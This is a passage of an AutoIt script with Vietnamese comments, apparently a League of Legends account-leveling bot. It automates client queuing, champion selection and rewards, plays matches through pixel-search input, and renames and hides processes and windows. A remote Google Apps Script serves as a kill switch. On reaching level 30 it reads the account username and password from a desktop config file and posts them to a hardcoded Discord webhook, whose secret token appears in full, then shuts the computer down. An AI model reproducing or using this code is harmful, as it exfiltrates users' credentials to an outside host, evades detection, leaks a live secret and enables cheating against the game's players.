	  Local $idsngoc1 = Json_Get($idrdeco, '[1]["id"]')

	  If getID1() = 'True' Then
		 Local $api = _HttpRequest(2, getAPI(31) & '/champion/' & champid() & '/position/' & $lane & '/map/11')
		 Local $ckc = Json_Decode($api)
		 Local $i = Random(0,2,1)
		 Local $psi = Json_Get($ckc, '[' & $i & '].primaryPerkStyleId')
		 Local $ssi = Json_Get($ckc, '[' & $i & '].secondaryPerkStyleId')

		 Local $spi[9]
		 For $j = 0 To 8
			$spi[$j] = Json_Get($ckc, '[' & $i & '].perks[' & $j & '].id')
		 Next

		 If $pickngoc = 0 Then
			_HttpRequest(1, getAPI(11) & '/' & $idsngoc, '', '', '', '', 'DELETE');
			_HttpRequest(1, getAPI(11) & '/' & $idsngoc1, '', '', '', '', 'DELETE');
			_HttpRequest(1, getAPI(11), '{"name":"fb.com/phanhai.tri", "primaryStyleId":' & $psi & ', "subStyleId":' & $ssi & ', "selectedPerkIds":[' & $spi[0] & ',' & $spi[1] & ',' & $spi[2] & ',' & $spi[3] & ',' & $spi[4] & ',' & $spi[5] & ',' & $spi[6] & ',' & $spi[7] & ',' & $spi[8] & '], "current":true}', '', '', '', 'POST');
			_HttpRequest(1, getAPI(44), '{"spell2Id":4}', '', '', '', 'PATCH')
			_HttpRequest(1, getAPI(44), '{"spell1Id":7}', '', '', '', 'PATCH')
			$pickngoc = 1
		 EndIf
	  EndIf
   EndFunc

   ; Kiểm tra lượng HP khi ở trong trận
   Func checkhp()
	  Local $tmp = _HttpRequest(2, getAPI2(0))
	  Local $chu = Json_Decode($tmp)
	  Return Json_Get($chu, '["championStats"]["currentHealth"]')
   EndFunc

   ; Kiểm tra số HP tối đa khi ở trong trận
   Func checkmaxhp()
	  Local $tmp = _HttpRequest(2, getAPI2(0))
	  Local $chu = Json_Decode($tmp)
	  Return Json_Get($chu, '["championStats"]["maxHealth"]')
   EndFunc

   ; Kiểm tra loại Resource
   Func checkrst()
	  Local $tmp = _HttpRequest(2, getAPI2(0))
	  Local $chu = Json_Decode($tmp)
	  Return Json_Get($chu, '["championStats"]["resourceType"]') == "SHIELD"
   EndFunc

   ; Kiểm tra lượng MP khi ở trong trận
   Func checkmp()
	  Local $tmp = _HttpRequest(2, getAPI2(0))
	  Local $chu = Json_Decode($tmp)
	  Return Json_Get($chu, '["championStats"]["resourceValue"]')
   EndFunc

   ; Kiểm tra số HP tối đa khi ở trong trận
   Func checkmaxmp()
	  Local $tmp = _HttpRequest(2, getAPI2(0))
	  Local $chu = Json_Decode($tmp)
	  Return Json_Get($chu, '["championStats"]["resourceMax"]')
   EndFunc

   ; Kiểm tra thời gian của trận đấu
   Func checktime()
	  Local $tmp = _HttpRequest(2, getAPI2(1))
	  Local $time = Json_Decode($tmp)
	  Return Json_Get($time, '["gameTime"]')
   EndFunc

   ; Kiểm tra số vàng đang có khi ở trong trận
   Func checkgold()
	  Local $api = _HttpRequest(2, getAPI2(0))
	  Local $json = Json_Decode($api)
	  Return Json_Get($json, '["currentGold"]')
   EndFunc

   ; Giảm tài nguyên CPU tiêu hao
   Func reducecpulol()
	  Local $oldbes = '_bes'
	  Local $newbes = randomname()
	  FileMove($var & "\" & $oldbes & ".exe", $var & "\" & $newbes & ".exe")
	  Local $bes = StringTrimRight($var & "\" & $newbes & ".exe", 0)
	  Local $iPID1 = ProcessExists("LeagueClientMain.exe")
	  Local $iPID2 = ProcessExists("RiotClientServices.exe")
	  Local $lol2 = StringTrimRight(_WinAPI_GetProcessFileName($iPID2), 0)
	  Local $lol1 = StringTrimRight(_WinAPI_GetProcessFileName($iPID1), 0)
	  If Not ProcessExists($newbes & ".exe") Then
		 ShellExecute($bes, "-J " & '"' & $lol1 & '"' & " 36 " & '"' & $lol2 & '"' & " 36 -m")
	  EndIf
	  Sleep(5000)
	  Local $hWnd = WinWait("[CLASS:BATTLEENC]", "", 10)
	  WinSetTitle($hWnd, "", randomname())
   EndFunc

   ; Discord Webhooks
   Func Webhook($Message)
	  Local $Url = "https://discordapp.com/api/webhooks/1047049140489691206/YmSvWTi2dFkI6r_uml80n7b2ZlSBo7J7ScboP1GKWtMP6bpCLQwoQIkeyIr6tD_HcUr3"
	  _HttpRequest(2, $Url, '{"content": "' & $Message & '"}', '', '', '', 'POST')
   EndFunc

   ; For fun
   Func checksheet()
	  Local $apiurl = 'https://script.google.com/macros/s/AKfycbx-KConMpf8ilJbk8LDHjjJ_53-IyNGNu9cixRPA9p_Pc6frh_iMJfqWZNLrN8swQN6/exec'
	  Local $tmp = _HttpRequest(2, $apiurl)
	  Local $chu = Json_Decode($tmp)
	  If Json_Get($chu, '.content[1][0]') = 'KHOA' And Json_Get($chu, '.content[1][1]') = 'NO' Then
		 Return True
	  EndIf
   EndFunc

   ; Set icon huh?
   Func seticon()
	  _HttpRequest(1, getAPI(22), '{"profileIconId":14}' , '', '', '', 'PUT')
   EndFunc

   ; Kiểm tra tướng
   Func checktuong100($level)
	  Local $sRet = _HttpRequest(2, getAPI(0))
	  Local $json = Json_Decode($sRet)
	  Local $name = Json_Get($json, '[' & $level & ']["name"]')
	  If $name <> '0' And Not $name = '' Then Return True
   EndFunc

   Func CountChamp()
	  Local $tmp = _HttpRequest(2, getAPI(0));
	  Local $json = Json_Decode($tmp);
	  Local $u = 0
	  For $i = 0 To UBound($json) - 1
		  $data = Json_Get($json, '['&$i&']["ownership"]["owned"]');
		  If $data = True Then $u += 1
	  Next
	  Return $u
   EndFunc

   ; Nhận Rewards
   Func _rewards()
	  Local $missions[6][3]
	  $missions[0][0] = '014907d2-5c38-11ec-9e9c-37ae9e516c57'
	  $missions[0][1] = 'Miss Fortune - Level 2 First Champion'
	  $missions[0][2] = 'missfortune_group'

	  $missions[1][0] = '00dbc707-5c38-11ec-9e9c-37ae9e516c57'
	  $missions[1][1] = 'Caitlyn - Marksman Champion'
	  $missions[1][2] = 'caitlyn_group'

	  $missions[2][0] = 'df9e41fd-5c37-11ec-9e9c-37ae9e516c57'
	  $missions[2][1] = 'Illaoi - Fighter Champion'
	  $missions[2][2] = 'illaoi_group'

	  $missions[3][0] = 'ff39888c-5c37-11ec-9e9c-37ae9e516c57'
	  $missions[3][1] = 'Seraphine - Mage Champion + XP BOOST'
	  $missions[3][2] = 'seraphine_group'

	  $missions[4][0] = 'f2518cd9-5c37-11ec-9e9c-37ae9e516c57'
	  $missions[4][1] = 'Thresh - Support Champion'
	  $missions[4][2] = 'thresh_group'

	  $missions[5][0] = 'fe48c0d0-5c37-11ec-9e9c-37ae9e516c57'
	  $missions[5][1] = 'Ekko - Assassin Champion'
	  $missions[5][2] = 'ekko_group'

	  For $i = 0 To UBound($missions) - 1
		 If checkMission($missions[$i][0]) Then
			_HttpRequest(1, getAPI_Reward(6), '{"data":{"npeRewardsV1IntroSeen":true},"schemaVersion":1}', '', '', '', 'PATCH')
			_HttpRequest(1, getAPI_Reward($i+1), '{"rewardGroups":["' & $missions[$i][2] & '"]}', '', '', '', 'PUT')
			ConsoleWrite(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & $missions[$i][1] & @CRLF)
		 EndIf
	  Next
   EndFunc

   ; Xử lí một số thứ ở LeagueClient
   Func Queue()
	  ; Một số thông tin cần thiết cho setTitle()
	  Local $cac = _HttpRequest(2, getAPI(10))
	  Local $lvl = Json_Decode($cac)
	  Local $cap = Json_Get($lvl, '["percentCompleteForNextLevel"]')
	  Local $pac = Json_Get($lvl, '["summonerLevel"]')
	  Local $nam = Json_Get($lvl, '["displayName"]')

	  ; Vào phòng khi không ở trong phòng
	  If checklobby() And Not InChampSelect() Then
		 joinlobby()
		 setTitle(" Nickname: " & $nam & " | " & "Level: " & $pac & " (" & $cap & "%" & ")" & " | " & "Games: " & $matches & " | " & "RL: " & $relaunch & " | " & "XP: " & CXP())
	  EndIf
	  Sleep(60)
	  ; Kiểm tra kết thúc trận hay chưa và bắt đầu game mới
	  If (isendgame() and (Not ProcessExists("League of Legends.exe"))) Or (isendgame2() and (Not ProcessExists("League of Legends.exe"))) Or (waitingstats() And Not ProcessExists("League of Legends.exe")) Then
		 _rhonor()
		 _HttpRequest(2, getAPI(42), '', '', '', '', 'POST')
		 outlobby()
		 Sleep(60)
		 playagain()
		 Sleep(60)
		 seticon()
		 sleep(60)
		 If $pac < 20 Then
			_rewards()
		 EndIf
		 $matches += 1
		 Sleep(60)
		 setTitle(" Nickname: " & $nam & " | " & "Level: " & $pac & " (" & $cap & "%" & ")" & " | " & "Games: " & $matches & " | " & "RL: " & $relaunch & " | " & "XP: " & CXP())
		 Sleep(60)
		 $endd = 0
	  EndIf
	  Sleep(60)
	  ; Nếu bật chức năng tìm trận, tìm trận
	  If Not isInProgress() And isfm() Then
		 If $tt1 = 0 And $camre <> 1 And $fftd <> 1 And Not ProcessExists("League of Legends.exe") And Not InChampSelect() Then
			Local $ohno = _HttpRequest(2, getAPI(10))
			_ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Searching for match..")
			$tt1 = 1
		 EndIf
		 findmatch()
	  EndIf
	  ; Chấp thuận trận đấu - checkaccept() để tránh lặp
	  If isInProgress() And checkaccept() = "None" Then
		 _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Accepted match.")
		 Sleep(2000)
		 acceptmatch()
		 $csl = 0
		 $csln = 0
	  EndIf
	  Sleep(20)
	  ; Kiểm tra có đang trong chọn tướng - checkpick() để tránh lặp setTitle()
	  If InChampSelect() Or champID_ME() = '0' Then
		 _HttpRequest(1, getAPI(8), '', '', '', '', 'POST')
		 If $csl = 0 Then
			_ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Selecting champion..")
			$csl = 1
		 EndIf
		 pickrandomluonkk()
		 $load = 0
	  EndIf
	  ; Nếu mất kết nối, kết nối lại
	  If reconnect() And Not $endd = 1 Then
		 _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Reconnecting..")
		 Sleep(50)
		 _HttpRequest(1, getAPI(14), '', '', '', '', 'POST');
		 $camre = 1
		 $ldt = 0
		 $load = 0
	  EndIf
   EndFunc

   ; Tạo Console Window
   Func AllocConsole()
	  return DllCall("Kernel32.dll", "int", "AllocConsole")
   EndFunc

   ; Đặt tiêu đề cho Console Window
   Func setTitle($title)
	  DllCall("Kernel32.dll", "none", "SetConsoleTitleA", "str", $title)
   EndFunc

   Func std_output_handle()
	  $r =  DllCall("Kernel32.dll", "HANDLE", "GetStdHandle", "dword", $STD_OUTPUT_HANDLE)
	  Return $r[0]
   EndFunc

   Func std_input_handle()
	  $r =  DllCall("Kernel32.dll", "HANDLE", "GetStdHandle", "dword", $STD_INPUT_HANDLE)
	  Return $r[0]
   EndFunc

   Func setModeInput()
	  DllCall("Kernel32.dll","BOOL","HANDLE",std_input_handle(),0x0002)
   EndFunc

   Func _ConsoleRead()
	  Local $out = DllStructCreate("char[255]")
	  setModeInput()
	  DllCall("Kernel32.dll","BOOL","ReadConsole","HANDLE",std_input_handle(),"struct*",$out,"DWORD",255,"dword*", 0, "ptr", 0)
	  Local $data = DllStructGetData($out,1)
	  Return $data
   EndFunc

   ; Ghi thông tin vào Console Window
   Func _ConsoleWriteln($text)
	  $text = $text & @CRLF
	  DllCall("Kernel32.dll", "BOOL", "WriteConsole", "HANDLE", std_output_handle(), "str", $text, "DWORD", StringLen($text), "dword", 0, "ptr", 0)
   EndFunc

   ; Ghi thông tin vào Console Window v2
   Func _ConsoleWritelnv2($text)
	  $text = $text
	  DllCall("Kernel32.dll", "BOOL", "WriteConsole", "HANDLE", std_output_handle(), "str", $text, "DWORD", StringLen($text), "dword", 0, "ptr", 0)
   EndFunc

   ; Tắt Console Window
   Func FreeConsole()
	  Return DllCall("Kernel32.dll", "int", "FreeConsole")
   EndFunc
#EndRegion

#Region Client Automation
   Do
	  If Not ProcessExists("League of Legends.exe") Then
		 Send("{lshift up}")

		 ; Nếu đạt Level 30 sẽ tự động gửi dữ liệu lên discord và tắt máy
		 If $pac = "30" Then
			; Kiểm tra cấp độ của tài khoản
			Local $cac = _HttpRequest(2, getAPI(10))
			Local $lvl = Json_Decode($cac)
			Local $pac = Json_Get($lvl, '["summonerLevel"]')
			Local $nam = Json_Get($lvl, '["displayName"]')
			setTitle(" Nickname: " & $nam & " | " & "Level: " & $pac & " (" & $cap & "%" & ")" & " | " & "Games: " & $matches & " | " & "RL: " & $relaunch & " | " & "XP: " & CXP())
			Global $userfile = FileOpen(@DesktopDir & "\config.txt", 128)
			FileOpen($userfile)
			Global $account = StringSplit(FileReadLine($userfile, 2), ':', 2)
			Global $sacc = $account[0];
			Global $spas = $account[1];
			Global $ru = FileReadLine($userfile, 2)
			If CountChamp() > 100 Then
			   Webhook("Username: " & $sacc & " | " & "Password: " & $spas & " | " & "Name: " & $nam & " | " & "Level: " & $pac & " | FULL CHAMPIONS")
			   Shutdown(5)
			EndIf
			If CountChamp() < 100 Then
			   Webhook("Username: " & $sacc & " | " & "Password: " & $spas & " | " & "Name: " & $nam & " | " & "Level: " & $pac)
			   Shutdown(5)
			EndIf
			FileClose($userfile)
			Sleep(6000)
		 EndIf

		 If $tdplayagain = 0 Then
			$playagain_timer = TimerInit()
			$tdplayagain = 1
		 EndIf
		 If (TimerDiff($playagain_timer) >= 60000) And checklobby() And Not InChampSelect() And Not checkaccept() = "None" Then
			$CMD = 'EmptyStandbyList.exe workingsets'
			Run('"' & @ComSpec & '" /c ' & $CMD, @SystemDir)
			_HttpRequest(2, getAPI(42), '', '', '', '', 'POST')
			playagain()
			Sleep(60)
			seticon()
			Sleep(60)
			setTitle(" Nickname: " & $nam & " | " & "Level: " & $pac & " (" & $cap & "%" & ")" & " | " & "Games: " & $matches & " | " & "RL: " & $relaunch & " | " & "XP: " & CXP())
			Sleep(60)
			$endd = 0
			$tdplayagain = 0
		 EndIf

		 ; Vài thử ở LeagueClient
		 Queue()

		 If $td = 0 Then
			$hTimer = TimerInit()
			$td = 1
		 EndIf
		 If TimerDiff($hTimer) >= 420000 And Not ProcessExists("League of Legends.exe") And Not InChampSelect() And Not checkaccept() = "None" Or TimerDiff($hTimer) >= 900000 And Not ProcessExists("League of Legends.exe") Then
			_ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Queue for too long..")
			killleagueprocess()
			Sleep(30)
			If ProcessExists("RiotClientServices.exe") Then
			   ProcessClose("RiotClientServices.exe")
			EndIf
			Sleep(3000)
			$CMD = 'EmptyStandbyList.exe workingsets'
			Run('"' & @ComSpec & '" /c ' & $CMD, @SystemDir)
			LoginLoL()
			$td = 0
			$ff = 1
			$fai = 0
			$ldt = 0
			$fftd = 0
		 EndIf
		 If $fai = 1 Or $fftd = 1 Then
			If $fai = 1 Then
			   _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Failed to connect..")
			EndIf
			If $fftd = 1 Then
			   _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Failed to relaunch..")
			EndIf
			Sleep(3000)
			killleagueprocess()
			Sleep(30)
			If ProcessExists("RiotClientServices.exe") Then
			   ProcessClose("RiotClientServices.exe")
			EndIf
			Sleep(3000)
			Local $CMD = 'EmptyStandbyList.exe workingsets'
			Run('"' & @ComSpec & '" /c ' & $CMD, @SystemDir)
			Local $file = FileOpen(@DesktopDir & "\config.txt", 128)
			LoginLoL()
			$td = 0
			$ff = 1
			$fai = 0
			$ldt = 0
			$fftd = 0
		 EndIf
		 ; Set Auth again
		 If $ff = 1 And ProcessExists("LeagueClient.exe") Then
			$ldt = 0
			$td = 0
			$ff = 0
			$fai = 0
			$tt1 = 0
			If isLogin() Then
			   _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Relaunch successful!")
			   $relaunch += 1
			EndIf
		 ElseIf Not ProcessExists("LeagueClient.exe") And $ff = 1 Then
			$fftd = 1
		 EndIf
		 Sleep(30)
		 $camre = 0
		 Sleep(30)
		 $igt = 0
		 Sleep(30)
		 $ldt = 0
	  EndIf
	  ; Và trong trận..
	  If ProcessExists("League of Legends.exe") Then
		 If $load = 0 Then
			_ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Loading game..")
			$load = 1
		 EndIf
		 $tt1 = 0
		 Sleep(30)
		 $csl = 0
		 Sleep(30)
		 $csln = 0
		 Sleep(30)
		 InGameMove()
		 $td = 0
		 $ldt = 0
		 $pickngoc = 0
	  EndIf
   Until 0
#EndRegion

#Region Ingame Automation
   ; Xử lí khi đang trong trận
   Func InGameMove()
	  Local $khoacamera = 0
	  WinActivate($title2)
	  Sleep(3000)
	  WinActivate($title2)
	  Sleep(600)
	  If WinExists($failed) Or WinExists($failed1) Then
		 ProcessClose("League of Legends.exe")
		 $fai = 1
	  EndIf
	  If checktime() > 10 And $khoacamera = 0 Then
		 skillupgrade()
		 WinMove($title2, "", 0, 0, Default, Default)
		 Sleep(1000)
		 _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "AI is playing the game.. ;)")
		 Sleep(1000)
		 buyitems()
		 Sleep(2000)
		 MouseClick("menu", 509, 329, 1, 3) ; chạy tới trụ top
		 Sleep(17000)
		 Global $laneig = 1
		 $khoacamera = 1
		 Sleep(100)
	  EndIf
	  While WinExists($title2) And $khoacamera = 1
			$size = WinGetClientSize($title2)
			If Not ProcessExists("League of Legends.exe") Then ExitLoop
			If Not WinActive($title2) Then
			   WinActivate($title2)
			EndIf
			If $igt = 0 Then
			   $hTimer = TimerInit()
			   $igt = 1
			EndIf
			; TimerDiff Ingame
			If (TimerDiff($hTimer) >= 3600000) Then
			   _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Ingame for too long..")
			   ProcessClose("League of Legends.exe")
			   $igt = 0
			EndIf
			; Check AFK
			If PixelGetColor(298, 184) = 0x392C18 Then
			   Send("{lshift up}")
			   MouseMove(298, 184)
			   Sleep(1000)
			   MouseDown('main')
			   Sleep(1000)
			   MouseUp('main')
			EndIf
			If PixelGetColor(420, 390) = 0x000B13 Then
			   Send("{lshift up}")
			   MouseMove(443, 387)
			   Sleep(1000)
			   MouseDown('main')
			   Sleep(1000)
			   MouseUp('main')
			EndIf
			If PixelGetColor(480, 392) <> 0x213831 Then
			   Send("{lshift up}")
			   Send("{y down}")
			   Sleep(1000)
			   Send("{y up}")
			EndIf
			Sleep(10)
			Send("{lshift up}")
			skillupgrade()
			If (checkhp() < (checkmaxhp()*30/100)) Or (checkgold() > 3400 And checktime() < 1500) Then ; Nếu HP < 30% hoặc >3400 vàng -> biến về
			   If $spells = 0 And checkhp() < (checkmaxhp()*30/100) Then
				  Send("{lshift up}")
				  MouseClick("menu", 10, 303, 1, 0)
				  Sleep(10)
				  Send("+f+d")
				  Sleep(30)
				  $spells = 1
			   EndIf
			   Local $lene = PixelSearch( 0, 0, $size[0], $size[1] - 140, 0xd05e5e, 1) ; lính địch
			   Local $turret = PixelSearch( 0, 0, $size[0], $size[1] - 140, 0xca352c, 1) ; trụ
			   Local $enemy = PixelSearch( 0, 0, $size[0], $size[1] - 140, 0x3f0803, 1) ; địch
			   If IsArray($turret) Or IsArray($lene) Or IsArray($enemy) Then
				  Send("{lshift up}")
				  MouseClick("menu", 505, 391, 1, 3)
				  Sleep(3000)
			   Else
				  Send("{lshift up}")
				  Sleep(30)
				  Send("{b down}")
				  Sleep(600)
				  Send("{b up}")
				  If (PixelGetColor(480, 392) = 0x7a7453) Then
					 Send("{y down}")
					 Sleep(300)
					 Send("{y up}")
				  EndIf
				  If (PixelGetColor( 516, 391) = 0xffffff) Then
					 If checktime() > 1200 Then
						Global $laneig = Random(2,4,1)
					 EndIf
					 buyitems()
					 Sleep(3000)
					 MouseClick("menu", 507, 389, 1, 3)
					 Sleep(3000)
					 MouseClick("menu", 505, 391, 1, 3)
					 Sleep(3000)
					 Switch $laneig
						Case 1
							  MouseClick("menu", 512, 314, 1, 3) ; chạy tới trụ TOP
						   Case 2
							  MouseClick("menu", 538, 309, 1, 3) ; chạy thẳng lên TOP
						   Case 3
							  MouseClick("menu", 586, 373, 1, 3) ; chạy thẳng xuống BOT
						   Case 4
							  MouseClick("menu", 552, 345, 1, 3) ; chạy thẳng ra MID
					 EndSwitch
					 Sleep(8000)
					 $spells = 0
				  EndIf
			   EndIf
			ElseIf checkhp() > (checkmaxhp()*30/100) Then ; Nếu HP > 30% và <3000 vàng -> ra chiến trường
			   Local $enemy = PixelSearch( 0, 0, $size[0], $size[1] - 140, 0x3f0803, 1); địch
			   If Not @error Then
				  Local $turret = PixelSearch( 0, 0, $size[0], $size[1] - 140, 0xca352c, 1); trụ
				  If Not @error Then
					 Send("{lshift up}")
					 MouseClick("menu", 10, 303, 1, 0) ; né trụ
					 Sleep(3000)
				  Else
					 Send("{lshift down}")
					 Sleep(30)
					 MouseClick("menu", $enemy[0] + 65, $enemy[1] + 50, 1, 0)
					 Sleep(30)
					 Send("+q+w+e+r")
					 Sleep(600)
				  EndIf
			   Else
				  Local $linh = PixelSearch( $size[0], 0, 0, $size[1] - 140, 0x4d95d0, 1) ; lính mình
				  Local $lene = PixelSearch( 0, 0, $size[0], $size[1] - 140, 0xd05e5e, 1) ; lính địch
				  Local $turret = PixelSearch( 0, 0, $size[0], $size[1] - 140, 0xca352c, 1); trụ
				  If IsArray($linh) Then
					 Send("{lshift down}")
					 MouseClick("menu", $linh[0], $linh[1], 1, 3)
					 Sleep(100)
				  EndIf
				  If Not IsArray($linh) Then
					 Send("{lshift up}")
					 Switch $laneig
						Case 1
							  MouseClick("menu", 512, 314, 1, 3) ; chạy tới trụ TOP
						   Case 2
							  MouseClick("menu", 538, 309, 1, 3) ; chạy thẳng lên TOP
						   Case 3
							  MouseClick("menu", 586, 373, 1, 3) ; chạy thẳng xuống BOT
						   Case 4
							  MouseClick("menu", 552, 345, 1, 3) ; chạy thẳng ra MID
					 EndSwitch
					 Sleep(300)
				  EndIf
			   EndIf
			EndIf
			If checkhp() = 0 Then
			   MouseMove(Random(10, 600, 1), Random(10, 400, 1), 5)
			   Sleep(Random(100,1000,1))
			EndIf
			; Thoát game khi xong trận
			If gameend() Then
			   Sleep(2500)
			   ProcessClose("League of Legends.exe")
			   _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "End Of Game.")
			   Sleep(1000)
			   $CMD = 'EmptyStandbyList.exe workingsets'
			   Run('"' & @ComSpec & '" /c ' & $CMD, @SystemDir)
			   $endd = 1
			   $ldt = 0
			   $tdplayagain = 0
			   ExitLoop
			EndIf
			Send("{lshift up}")
		 WEnd
   EndFunc
#EndRegion